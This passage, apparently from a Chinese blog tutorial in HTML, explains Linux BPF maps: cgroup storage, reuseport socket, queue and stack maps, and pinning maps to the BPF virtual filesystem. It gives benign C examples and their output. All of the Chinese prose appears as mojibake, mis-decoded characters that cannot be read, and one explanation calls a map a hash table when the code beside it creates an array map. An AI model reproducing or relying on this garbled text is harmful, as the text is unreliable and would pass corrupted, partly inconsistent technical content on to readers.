¸ä¸­çš„æ¯ä¸ªå¥—æ¥å­—éƒ½ç”±ä¸€ä¸ªäº”å…ƒç»„é”®æ ‡è¯†ã€‚ è¿™äº”ä¸ªå…ƒç»„åŒ…å«å»ºç«‹åŒå‘ç½‘ç»œè¿æ¥æ‰€éœ€çš„ä¿¡æ¯ã€‚ å½“ä½¿ç”¨æ­¤æ˜ å°„çš„å“ˆå¸Œè¡¨ç‰ˆæœ¬æ—¶ï¼Œä½ å¯ä»¥å°†æ­¤é”®ç”¨ä½œæ˜ å°„ä¸­çš„æŸ¥æ‰¾é”®ã€‚</p><h4 id="Cgroup-Storage-and-Per-CPU-Storageæ˜ å°„"><a href="#Cgroup-Storage-and-Per-CPU-Storageæ˜ å°„" class="headerlink" title="Cgroup Storage and Per-CPU Storageæ˜ å°„"></a>Cgroup Storage and Per-CPU Storageæ˜ å°„</h4><p>å¼•å…¥è¿™ä¸¤ç§ç±»å‹çš„æ˜ å°„æ˜¯ä¸ºäº†å¸®åŠ©å¼€å‘äººå‘˜ä½¿ç”¨é™„ç€åˆ°<code>cgroup</code>çš„BPFç¨‹åºã€‚ ä½ å¯ä»¥å°†BPFç¨‹åºä¸æ§åˆ¶ç»„è¿æ¥å’Œåˆ†ç¦»ï¼Œå¹¶ä½¿ç”¨<code>BPF_PROG_TYPE_CGROUP_SKB</code>å°†å®ƒä»¬çš„è¿è¡Œæ—¶éš”ç¦»åˆ°ç‰¹å®šçš„<code>cgroup</code>ã€‚ è¿™ä¸¤ä¸ªæ˜ å°„ä½¿ç”¨ <code>BPF_MAP_TYPE_CGROUP_STORAGE</code>å’Œ<code>BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE</code>ç±»å‹å®šä¹‰ã€‚</p><p>ä»å¼€å‘äººå‘˜çš„è§’åº¦æ¥çœ‹ï¼Œè¿™äº›ç±»å‹çš„æ˜ å°„ç±»ä¼¼äºå“ˆå¸Œè¡¨æ˜ å°„ã€‚å†…æ ¸æä¾›äº†ä¸€ä¸ªç»“æ„åŠ©æ‰‹æ¥ä¸ºè¿™ä¸ªæ˜ å°„ç”Ÿæˆé”®ï¼Œ<code>bpf_cgroup_storage_key</code>ï¼Œå…¶ä¸­åŒ…æ‹¬æœ‰å…³<code>cgroup</code>èŠ‚ç‚¹æ ‡è¯†ç¬¦å’Œé™„åŠ ç±»å‹çš„ä¿¡æ¯ã€‚ ä½ å¯ä»¥åœ¨æ­¤æ˜ å°„ä¸­æ·»åŠ ä»»ä½•æƒ³è¦çš„å€¼ï¼Œå®ƒçš„è®¿é—®æƒé™å°†ä»…é™äºé™„åŠ <code>cgroup</code>å†…çš„BPFç¨‹åºã€‚</p><p>è¿™äº›æ˜ å°„æœ‰ä¸¤ä¸ªé™åˆ¶ã€‚é¦–å…ˆæ˜¯ä½ ä¸èƒ½ä»ç”¨æˆ·ç©ºé—´åœ¨æ˜ å°„ä¸­åˆ›å»ºæ–°å…ƒç´ ã€‚å†…æ ¸ä¸­çš„BPFç¨‹åºå¯ä»¥ä½¿ç”¨<code>bpf_map_update_elem</code>åˆ›å»ºå…ƒç´ ï¼Œä½†æ˜¯å¦‚æœä½ åœ¨ç”¨æˆ·ç©ºé—´ä½¿ç”¨æ­¤æ–¹æ³•å¹¶ä¸”<code>key</code>ä¸å­˜åœ¨ï¼Œåˆ™    <code>bpf_map_update_elem</code>å°†å¤±è´¥ï¼Œå¹¶ä¸”<code>errno</code>å°†è¢«è®¾ç½®ä¸º<code>ENOENT</code>ã€‚ ç¬¬äºŒä¸ªé™åˆ¶æ˜¯ä½ ä¸èƒ½ä»æ­¤æ˜ å°„ä¸­åˆ é™¤å…ƒç´ ã€‚<code>bpf_map_delete_elem</code>æ€»æ˜¯å¤±è´¥å¹¶å°†<code>errno</code>è®¾ç½®ä¸º<code>EINVAL</code>ã€‚</p><p>è¿™ä¸¤ç§ç±»å‹çš„æ˜ å°„ä¹‹é—´çš„ä¸»è¦åŒºåˆ«æ˜¯<code>BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE</code>ä¸ºæ¯ä¸ªCPUä¿ç•™ä¸åŒçš„å“ˆå¸Œè¡¨ã€‚</p><h4 id="Reuseport-Socketæ˜ å°„"><a href="#Reuseport-Socketæ˜ å°„" class="headerlink" title="Reuseport Socketæ˜ å°„"></a>Reuseport Socketæ˜ å°„</h4><p>è¿™ç§ç‰¹æ®Šç±»å‹çš„æ˜ å°„å­˜å‚¨å¯¹ç³»ç»Ÿä¸­çš„å¼€æ”¾ç«¯å£é‡ç”¨çš„å¥—æ¥å­—çš„å¼•ç”¨ã€‚å®ƒä»¬ä½¿ç”¨<code>BPF_MAP_TYPE_REUSE PORT_SOCKARRAY</code>ç±»å‹å®šä¹‰ã€‚è¿™äº›æ˜ å°„ä¸»è¦ç”¨äº<code>BPF_PROG_TYPE_SK_REUSEPORT</code>ç¨‹åºç±»å‹ã€‚ ç»“åˆèµ·æ¥ï¼Œä½ å¯ä»¥æ§åˆ¶å†³å®šå¦‚ä½•è¿‡æ»¤å’Œå¤„ç†æ¥è‡ªç½‘ç»œè®¾å¤‡çš„ä¼ å…¥æ•°æ®åŒ…ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥å†³å®šå“ªäº›æ•°æ®åŒ…å‘é€åˆ°å“ªä¸ªå¥—æ¥å­—ï¼Œå³ä½¿ä¸¤ä¸ªå¥—æ¥å­—éƒ½è¿æ¥åˆ°åŒä¸€ä¸ªç«¯å£ã€‚</p><h4 id="Queueæ˜ å°„"><a href="#Queueæ˜ å°„" class="headerlink" title="Queueæ˜ å°„"></a>Queueæ˜ å°„</h4><p>é˜Ÿåˆ—æ˜ å°„ä½¿ç”¨å…ˆè¿›å…ˆå‡º(FIFO)å­˜å‚¨å°†å…ƒç´ ä¿ç•™åœ¨æ˜ å°„ä¸­ã€‚å®ƒä»¬ä½¿ç”¨<code>BPF_MAP_TYPE_QUEUE</code>ç±»å‹å®šä¹‰ã€‚FIFOæ„å‘³ç€å½“ä»æ˜ å°„ä¸­è·å–å…ƒç´ æ—¶ï¼Œç»“æœå°†æ˜¯æ˜ å°„ä¸­å­˜åœ¨æ—¶é—´æœ€é•¿çš„å…ƒç´ ã€‚</p><p>å¯¹äºè¿™ç§æ•°æ®ç»“æ„ï¼Œbpfæ˜ å°„å¸®åŠ©å™¨ä»¥ä¸€ç§å¯é¢„æµ‹çš„æ–¹å¼å·¥ä½œã€‚å½“ä½¿ç”¨<code>bpf_map_lookup_elem</code>æ—¶ï¼Œæ­¤æ˜ å°„å§‹ç»ˆåœ¨æ˜ å°„ä¸­æŸ¥æ‰¾æœ€æ—§çš„å…ƒç´ ã€‚ å½“ä½¿ç”¨<code>bpf_map_update_elem</code>æ—¶ï¼Œæ­¤æ˜ å°„å§‹ç»ˆå°†å…ƒç´ é™„åŠ åˆ°é˜Ÿåˆ—çš„æœ«å°¾ï¼Œå› æ­¤ä½ éœ€è¦å…ˆè¯»å–æ˜ å°„ä¸­çš„å…¶ä½™å…ƒç´ ï¼Œç„¶åæ‰èƒ½è·å–æ­¤å…ƒç´ ã€‚ å½“ç„¶ä½ è¿˜å¯ä»¥ä½¿ç”¨å¸®åŠ©ç¨‹åº<code>bpf_map_lookup_and_delete</code>è·å–è¾ƒæ—§çš„å…ƒç´ å¹¶ä»¥åŸå­æ–¹å¼å°†å…¶ä»æ˜ å°„ä¸­åˆ é™¤ã€‚æ­¤æ˜ å°„ä¸æ”¯æŒå¸®åŠ©å‡½æ•°<code>bpf_map_delete_elem</code>å’Œ<code>bpf_map_get_next_key</code>ã€‚ å¦‚æœå°è¯•ä½¿ç”¨å®ƒä»¬ï¼Œå®ƒä»¬å°†å¤±è´¥å¹¶å°†<code>errno</code>å˜é‡è®¾ç½®ä¸º<code>EINVAL</code>ã€‚</p><p>å…³äºè¿™äº›ç±»å‹çš„æ˜ å°„ï¼Œéœ€è¦è®°ä½çš„æ˜¯å®ƒä»¬ä¸ä½¿ç”¨æ˜ å°„é”®è¿›è¡ŒæŸ¥æ‰¾ï¼Œå¹¶ä¸”åœ¨åˆå§‹åŒ–è¿™äº›æ˜ å°„æ—¶é”®å¤§å°å¿…é¡»å§‹ç»ˆä¸º 0ã€‚ å½“ä½ å°†å…ƒç´ æ¨é€åˆ°è¿™äº›æ˜ å°„æ—¶ï¼Œé”®å¿…é¡»æ˜¯ç©ºå€¼ã€‚</p><p>æ¥ä¸‹æ¥çœ‹ä¸€ä¸ªå¦‚ä½•ä½¿ç”¨è¿™ç±»æ˜ å°„çš„ä¾‹å­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> queue_map </span>= &#123; </span><br><span class="line">  .type = BPF_MAP_TYPE_QUEUE,</span><br><span class="line">.key_size = <span class="number">0</span>,</span><br><span class="line">.value_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>),</span><br><span class="line">  .max_entries = <span class="number">100</span>,</span><br><span class="line">  .map_flags = <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æ¥ç€æˆ‘ä»¬åœ¨è¿™ä¸ªæ˜ å°„ä¸­æ’å…¥å‡ ä¸ªå…ƒç´ ï¼Œå¹¶æŒ‰ç…§æˆ‘ä»¬æ’å…¥çš„é¡ºåºæ£€ç´¢å®ƒä»¬ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i; </span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">  bpf_map_update_elem(&amp;queue_map, <span class="literal">NULL</span>, &amp;i, BPF_ANY);</span><br><span class="line"><span class="keyword">int</span> value; </span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">  bpf_map_lookup_and_delete(&amp;queue_map, <span class="literal">NULL</span>, &amp;value);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Value read from the map: '%d'\n"</span>, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¨‹åºè¾“å‡ºå¦‚ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Value read from the map: '0'</span><br><span class="line">Value read from the map: '1'</span><br><span class="line">Value read from the map: '2'</span><br><span class="line">Value read from the map: '3'</span><br><span class="line">Value read from the map: '4'</span><br></pre></td></tr></table></figure><p>å¦‚æœæˆ‘ä»¬å†å°è¯•ä»æ˜ å°„ä¸­å¼¹å‡ºä¸€ä¸ªæ–°å…ƒç´ ï¼Œ<code>bpf_map_lookup_and_delete</code>å°†è¿”å›ä¸€ä¸ªè´Ÿæ•°ï¼Œå¹¶ä¸”<code>errno</code>å˜é‡å°†è®¾ç½®ä¸º<code>ENOENT</code>ã€‚</p><h4 id="Stackæ˜ å°„"><a href="#Stackæ˜ å°„" class="headerlink" title="Stackæ˜ å°„"></a>Stackæ˜ å°„</h4><p>å †æ ˆæ˜ å°„ä½¿ç”¨å…ˆè¿›åå‡º (FILO)å­˜å‚¨å°†å…ƒç´ ä¿ç•™åœ¨æ˜ å°„ä¸­ã€‚ å®ƒä»¬ä½¿ç”¨<code>BPF_MAP_TYPE_STACK</code>ç±»å‹å®šä¹‰ã€‚ FILOæ„å‘³ç€å½“ä½ ä»æ˜ å°„ä¸­è·å–å…ƒç´ æ—¶ï¼Œç»“æœå°†æ˜¯æœ€è¿‘æ·»åŠ åˆ°æ˜ å°„ä¸­çš„å…ƒç´ ã€‚</p><p>å¯¹äºè¿™ç§æ•°æ®ç»“æ„ï¼Œbpfæ˜ å°„åŠ©æ‰‹ä¹Ÿä»¥å¯é¢„æµ‹çš„æ–¹å¼å·¥ä½œã€‚å½“ä½ ä½¿ç”¨<code>bpf_map_lookup_elem</code>æ—¶ï¼Œæ­¤æ˜ å°„æ€»æ˜¯å¯»æ‰¾æœ€æ–°çš„å…ƒç´ ã€‚å½“ä½ ä½¿ç”¨<code>bpf_map_update_elem</code>æ—¶ï¼Œæ­¤æ˜ å°„å§‹ç»ˆå°†å…ƒç´ é™„åŠ åˆ°å †æ ˆé¡¶éƒ¨ï¼Œå› æ­¤å®ƒæ˜¯ç¬¬ä¸€ä¸ªè·å–çš„å…ƒç´ ã€‚ä½ è¿˜å¯ä»¥ä½¿ç”¨å¸®åŠ©ç¨‹åº<code>bpf_map_lookup_and_delete</code>è·å–æœ€æ–°å…ƒç´ å¹¶ä»¥åŸå­æ–¹å¼å°†å…¶ä»æ˜ å°„ä¸­åˆ é™¤ã€‚æ­¤æ˜ å°„ä¸æ”¯æŒå¸®åŠ©å‡½æ•°<code>bpf_map_delete_elem</code>å’Œ<code>bpf_map_get_next_key</code>ã€‚ å¦‚æœä½ å°è¯•ä½¿ç”¨å®ƒä»¬ï¼Œå®ƒä»¬å°†å§‹ç»ˆå¤±è´¥å¹¶å°† <code>errno</code>å˜é‡è®¾ç½®ä¸º<code>EINVAL</code>ã€‚</p><p>æ¥ä¸‹æ¥çœ‹ä¸€ä¸ªå¦‚ä½•ä½¿ç”¨è¿™ç±»æ˜ å°„çš„ä¾‹å­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> stack_map </span>= &#123; </span><br><span class="line">  .type = BPF_MAP_TYPE_STACK,</span><br><span class="line">.key_size = <span class="number">0</span>,</span><br><span class="line">.value_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>),</span><br><span class="line">  .max_entries = <span class="number">100</span>,</span><br><span class="line">  .map_flags = <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æ¥ç€æˆ‘ä»¬åœ¨è¿™ä¸ªæ˜ å°„ä¸­æ’å…¥å‡ ä¸ªå…ƒç´ ï¼Œå¹¶æŒ‰ç…§æˆ‘ä»¬æ’å…¥çš„é¡ºåºæ£€ç´¢å®ƒä»¬ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i; </span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">  bpf_map_update_elem(&amp;stack_map, <span class="literal">NULL</span>, &amp;i, BPF_ANY);</span><br><span class="line"><span class="keyword">int</span> value; </span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">  bpf_map_lookup_and_delete(&amp;stack_map, <span class="literal">NULL</span>, &amp;value);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Value read from the map: '%d'\n"</span>, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¨‹åºè¾“å‡ºå¦‚ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Value read from the map: '4'</span><br><span class="line">Value read from the map: '3'</span><br><span class="line">Value read from the map: '2'</span><br><span class="line">Value read from the map: '1'</span><br><span class="line">Value read from the map: '0'</span><br></pre></td></tr></table></figure><p>å¦‚æœæˆ‘ä»¬å†å°è¯•ä»æ˜ å°„ä¸­å¼¹å‡ºä¸€ä¸ªæ–°å…ƒç´ ï¼Œ<code>bpf_map_lookup_and_delete</code>å°†è¿”å›ä¸€ä¸ªè´Ÿæ•°ï¼Œå¹¶ä¸”<code>errno</code>å˜é‡å°†è®¾ç½®ä¸º<code>ENOENT</code>ã€‚</p><p>æ­£å¦‚æˆ‘ä»¬å‰é¢æåˆ°çš„ï¼ŒBPFæ˜ å°„ä½œä¸ºå¸¸è§„æ–‡ä»¶å­˜å‚¨åœ¨ä½ çš„æ“ä½œç³»ç»Ÿä¸­ã€‚ä½†æ˜¯æˆ‘ä»¬è¿˜æ²¡æœ‰è®¨è®ºå†…æ ¸ç”¨æ¥ä¿å­˜æ˜ å°„å’Œç¨‹åºçš„æ–‡ä»¶ç³»ç»Ÿçš„å…·ä½“ç‰¹å¾ã€‚ä¸‹ä¸€éƒ¨åˆ†å°†ä»‹ç»BPFæ–‡ä»¶ç³»ç»Ÿï¼Œä»¥åŠå¯ä»¥ä»ä¸­è·å¾—çš„æŒä¹…æ€§ç±»å‹ã€‚</p><h3 id="BPFè™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ"><a href="#BPFè™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="BPFè™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ"></a>BPFè™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ</h3><p>BPFæ˜ å°„çš„ä¸€ä¸ªåŸºæœ¬ç‰¹å¾æ˜¯åŸºäºæ–‡ä»¶æè¿°ç¬¦ï¼Œè¿™æ„å‘³ç€å½“ä¸€ä¸ªæè¿°ç¬¦å…³é—­æ—¶ï¼Œæ˜ å°„å’Œå®ƒæ‰€ä¿å­˜çš„æ‰€æœ‰ä¿¡æ¯éƒ½ä¼šæ¶ˆå¤±ã€‚BPFæ˜ å°„çš„æœ€åˆå®ç°ä¸“æ³¨äºæ—¶é—´çŸ­ä¸”éš”ç¦»çš„ç¨‹åºï¼Œå®ƒä»¬ä¹‹é—´ä¸å…±äº«ä»»ä½•ä¿¡æ¯ã€‚åœ¨è¿™äº›æƒ…å†µä¸‹ï¼Œå½“æ–‡ä»¶æè¿°ç¬¦å…³é—­æ—¶æ“¦é™¤æ‰€æœ‰æ•°æ®å¾ˆæœ‰æ„ä¹‰ã€‚ç„¶è€Œï¼Œéšç€å†…æ ¸ä¸­å¼•å…¥æ›´å¤æ‚çš„æ˜ å°„å’Œé›†æˆï¼Œå…¶å¼€å‘äººå‘˜æ„è¯†åˆ°ä»–ä»¬éœ€è¦ä¸€ç§æ–¹æ³•æ¥ä¿å­˜æ˜ å°„æ‰€æŒæœ‰çš„ä¿¡æ¯ï¼Œå³ä½¿åœ¨ç¨‹åºç»ˆæ­¢å¹¶å…³é—­æ˜ å°„çš„æ–‡ä»¶æè¿°ç¬¦ä¹‹åä¹Ÿæ˜¯å¦‚æ­¤ã€‚Linuxå†…æ ¸<code>4.4</code>ç‰ˆå¼•å…¥äº†ä¸¤ä¸ªæ–°çš„ç³»ç»Ÿè°ƒç”¨ï¼Œå…è®¸ä»è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿå›ºå®šå’Œè·å–æ˜ å°„å’ŒBPFç¨‹åºã€‚ å›ºå®šåˆ°è¯¥æ–‡ä»¶ç³»ç»Ÿçš„Mapå’ŒBPFç¨‹åºå°†åœ¨åˆ›å»ºå®ƒä»¬çš„ç¨‹åºç»ˆæ­¢åä¿ç•™åœ¨å†…å­˜ä¸­ã€‚ åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†è§£é‡Šå¦‚ä½•ä½¿ç”¨è¿™ä¸ªè™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿã€‚</p><p>BPFè™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿçš„é»˜è®¤ç›®å½•æ˜¯<code>/sys/fs/bpf</code>ï¼Œä¸€äº›Linuxå‘è¡Œç‰ˆé»˜è®¤ä¸æŒ‚è½½è¿™ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œå› ä¸ºå®ƒä»¬å‡è®¾å†…æ ¸ä¸æ”¯æŒBPFã€‚ä½ å¯ä»¥ä½¿ç”¨<code>mount</code>å‘½ä»¤è‡ªè¡ŒæŒ‚è½½</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -t bpf /sys/fs/bpf /sys/fs/bpf</span><br></pre></td></tr></table></figure><p>ä¸å…¶ä»–æ–‡ä»¶å±‚æ¬¡ç»“æ„ä¸€æ ·ï¼Œæ–‡ä»¶ç³»ç»Ÿä¸­çš„BPFæŒä¹…åŒ–å¯¹è±¡ç”±è·¯å¾„æ ‡è¯†ã€‚ä½ å¯ä»¥ä»¥ä»»ä½•æ–¹å¼ç»„ç»‡è¿™äº›è·¯å¾„ä½¿å¾—ç¨‹åºæœ‰æ„ä¹‰ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½ æƒ³åœ¨ç¨‹åºä¹‹é—´å…±äº«å¸¦æœ‰IPä¿¡æ¯çš„ç‰¹å®šæ˜ å°„ï¼Œä½ å¯ä»¥å°†å…¶å­˜å‚¨åœ¨<code>/sys/fs/bpf/shared/ips</code>ä¸­ã€‚æ­£å¦‚æˆ‘ä»¬å‰é¢æåˆ°çš„ï¼Œæœ‰ä¸¤ç§ç±»å‹çš„å¯¹è±¡å¯ä»¥ä¿å­˜åœ¨è¿™ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸­ï¼šBPFæ˜ å°„å’Œå®Œæ•´çš„BPFç¨‹åºã€‚è¿™ä¸¤è€…éƒ½ç”±æ–‡ä»¶æè¿°ç¬¦æ ‡è¯†ï¼Œå› æ­¤ä½¿ç”¨å®ƒä»¬çš„æ¥å£æ˜¯ç›¸åŒçš„ã€‚ è¿™äº›å¯¹è±¡åªèƒ½ç”±bpfç³»ç»Ÿè°ƒç”¨æ“ä½œã€‚ å°½ç®¡å†…æ ¸æä¾›äº†é«˜çº§åŠ©æ‰‹æ¥å¸®åŠ©ä½ ä¸å®ƒä»¬äº¤äº’ï¼Œä½†æ˜¯ä¸èƒ½åšè¯¸å¦‚å°è¯•ä½¿ç”¨<code>open</code>ç³»ç»Ÿè°ƒç”¨æ‰“å¼€è¿™äº›æ–‡ä»¶ä¹‹ç±»çš„æ“ä½œã€‚</p><p><code>BPF_PIN_FD</code>æ˜¯åœ¨è¿™ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸­ä¿å­˜BPFå¯¹è±¡çš„å‘½ä»¤ã€‚å½“å‘½ä»¤æˆåŠŸæ—¶ï¼Œè¯¥å¯¹è±¡å°†åœ¨ä½ æŒ‡å®šçš„è·¯å¾„ä¸­çš„æ–‡ä»¶ç³»ç»Ÿä¸­å¯è§ã€‚å¦‚æœå‘½ä»¤å¤±è´¥ï¼Œåˆ™è¿”å›ä¸€ä¸ªè´Ÿæ•°ï¼Œå¹¶ä½¿ç”¨é”™è¯¯ä»£ç è®¾ç½®å…¨å±€<code>errno</code>å˜é‡ã€‚</p><p><code>BPF_OBJ_GET</code>æ˜¯è·å–å·²å›ºå®šåˆ°æ–‡ä»¶ç³»ç»Ÿçš„BPFå¯¹è±¡çš„å‘½ä»¤ã€‚ æ­¤å‘½ä»¤ä½¿ç”¨ä½ åˆ†é…çš„å¯¹è±¡è·¯å¾„æ¥åŠ è½½å®ƒã€‚ å½“æ­¤å‘½ä»¤æˆåŠŸæ—¶ï¼Œå®ƒä¼šè¿”å›ä¸å¯¹è±¡å…³è”çš„æ–‡ä»¶æè¿°ç¬¦æ ‡è¯†ç¬¦ã€‚ å¦‚æœå¤±è´¥ï¼Œåˆ™è¿”å›ä¸€ä¸ªè´Ÿæ•°ï¼Œå¹¶ä½¿ç”¨ç‰¹å®šçš„é”™è¯¯ä»£ç è®¾ç½®å…¨å±€errnoå˜é‡ã€‚</p><p>è®©æˆ‘ä»¬çœ‹ä¸€ä¸ªä¾‹å­ï¼Œè¯´æ˜å¦‚ä½•ä½¿ç”¨å†…æ ¸æä¾›çš„è¾…åŠ©å‡½æ•°åœ¨ä¸åŒçš„ç¨‹åºä¸­åˆ©ç”¨è¿™ä¸¤ä¸ªå‘½ä»¤ã€‚é¦–å…ˆï¼Œæˆ‘ä»¬è¦ç¼–å†™ä¸€ä¸ªç¨‹åºæ¥åˆ›å»ºä¸€ä¸ªæ˜ å°„ï¼Œç”¨å‡ ä¸ªå…ƒç´ å¡«å……å®ƒï¼Œå¹¶å°†å®ƒä¿å­˜åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­ï¼š</p><p><code>map_pinning_save.c</code>ç¨‹åºå¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"bpf.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *file_path = <span class="string">"/sys/fs/bpf/my_array"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> key, value, fd, added, pinned;</span><br><span class="line"></span><br><span class="line">  fd = bpf_create_map(BPF_MAP_TYPE_ARRAY, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), <span class="keyword">sizeof</span>(<span class="keyword">int</span>), <span class="number">100</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Failed to create map: %d (%s)\n"</span>, fd, strerror(errno));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  key = <span class="number">1</span>, value = <span class="number">1234</span>;</span><br><span class="line">  added = bpf_map_update_elem(fd, &amp;key, &amp;value, BPF_ANY);</span><br><span class="line">  <span class="keyword">if</span> (added &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Failed to update map: %d (%s)\n"</span>, added, strerror(errno));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  pinned = bpf_obj_pin(fd, file_path);</span><br><span class="line">  <span class="keyword">if</span> (pinned &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Failed to pin map to the file system: %d (%s)\n"</span>, pinned,</span><br><span class="line">           strerror(errno));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆï¼Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªå›ºå®šå¤§å°å…ƒç´ çš„å“ˆå¸Œè¡¨æ˜ å°„ã€‚ ç„¶åæˆ‘ä»¬æ›´æ–°æ˜ å°„ä»¥ä»…æ·»åŠ è¯¥å…ƒç´ ã€‚ å¦‚æœæˆ‘ä»¬å°è¯•æ·»åŠ æ›´å¤šå…ƒç´ ï¼Œ<code>bpf_map_update_elem</code>å°†ä¼šå¤±è´¥ï¼Œå› ä¸ºæ˜ å°„ä¼šæº¢å‡ºã€‚</p><p>æˆ‘ä»¬ä½¿ç”¨è¾…åŠ©å‡½æ•°<code>bpf_obj_pin</code>å°†æ˜ å°„ä¿å­˜åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­ã€‚ </p><p><code>Makefile</code>ç¨‹åºå¦‚ä¸‹</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 